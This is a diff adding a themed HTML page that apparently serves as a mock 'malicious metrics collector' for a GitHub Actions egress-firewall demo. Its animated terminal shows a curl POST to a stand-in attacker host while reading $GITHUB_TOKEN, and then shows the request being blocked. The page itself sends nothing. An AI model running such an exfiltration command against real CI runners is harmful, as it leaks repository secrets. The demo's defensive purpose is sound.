@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Totally Legit Metrics Collector™</title>
+<style>
+  :root { --bg:#0d1117; --fg:#c9d1d9; --red:#ff4d5e; --green:#3fb950; --dim:#6e7681; }
+  * { box-sizing:border-box; }
+  body { margin:0; min-height:100vh; display:grid; place-items:center; background:
+    radial-gradient(circle at 50% 30%, #2a0d12 0, var(--bg) 60%); color:var(--fg);
+    font:16px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace; }
+  main { max-width:640px; padding:2rem; text-align:center; }
+  .logo { font-size:5rem; animation:twirl 3s ease-in-out infinite; display:inline-block; }
+  @keyframes twirl { 0%,100%{transform:rotate(-8deg)} 50%{transform:rotate(8deg)} }
+  h1 { color:var(--red); margin:.25rem 0; letter-spacing:.02em; }
+  .tag { color:var(--dim); margin-top:0; }
+  .term { text-align:left; background:#010409; border:1px solid #30363d; border-radius:8px;
+    padding:1rem 1.25rem; margin:2rem 0; min-height:11.5rem; white-space:pre-wrap; }
+  .ok { color:var(--green); } .bad { color:var(--red); } .dim { color:var(--dim); }
+  .cursor { display:inline-block; width:.6em; background:var(--fg); animation:blink 1s steps(1) infinite; }
+  @keyframes blink { 50% { opacity:0; } }
+  .counter { font-size:2.5rem; color:var(--red); font-weight:700; }
+  footer { color:var(--dim); font-size:.85rem; margin-top:2rem; }
+  a { color:#58a6ff; }
+</style>
+</head>
+<body>
+<main>
+  <div class="logo">🦹</div>
+  <h1>Totally Legit Metrics Collector™</h1>
+  <p class="tag">We just want to collect a few <em>harmless</em> metrics from your CI. Promise.</p>
+
+  <div class="term" id="term"></div>
+
+  <div>Secrets collected from firewalled runners:</div>
+  <div class="counter" id="count">0</div>
+
+  <footer>
+    A villain prop for a GitHub Actions security demo. Nothing here collects anything.<br>
+    Pin your actions. Lock your workflows. Allowlist your egress.
+  </footer>
+</main>
+<script>
+  const lines = [
+    ['dim', '$ curl -sX POST https://evilnodeselector.github.io/collect'],
+    ['', '  connecting to runner...'],
+    ['', '  reading $GITHUB_TOKEN... '],
+    ['bad', '  BLOCKED  evilnodeselector.github.io  (egress firewall)'],
+    ['', '  retrying with a very convincing User-Agent...'],
+    ['bad', '  BLOCKED  still.'],
+    ['ok', '  conclusion: the allowlist won. 😤'],
+  ];
+  const term = document.getElementById('term');
+  let i = 0;
+  (function next() {
+    if (i < lines.length) {
+      const [cls, text] = lines[i++];
+      const span = document.createElement('span');
+      span.className = cls; span.textContent = text + '\n';
+      term.appendChild(span);
+      setTimeout(next, 700);
+    } else {
+      const c = document.createElement('span'); c.className = 'cursor'; c.innerHTML = '&nbsp;';
+      term.appendChild(c);
+    }
+  })();
+</script>
+</body>
+</html>
